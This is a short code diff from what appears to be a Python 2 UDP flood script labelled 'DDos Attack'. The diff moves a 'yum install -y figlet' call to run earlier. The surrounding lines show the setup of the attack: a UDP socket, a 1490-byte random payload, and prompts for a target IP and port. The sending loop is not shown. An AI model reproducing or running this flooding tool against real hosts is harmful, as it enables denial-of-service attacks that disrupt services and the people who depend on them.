@@ -16,7 +16,7 @@ year = now.year
 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
 bytes = random._urandom(1490)
 #############
-
+os.system("yum install -y figlet")
 os.system("clear")
 os.system("figlet DDos Attack")
 print
@@ -29,7 +29,6 @@ ip = raw_input("IP Target : ")
 port = input("Port       : ")
 
 os.system("clear")
-os.system("yum install -y figlet")
 os.system("figlet Attack Starting")
 print "[                    ] 0% "
 time.sleep(1)
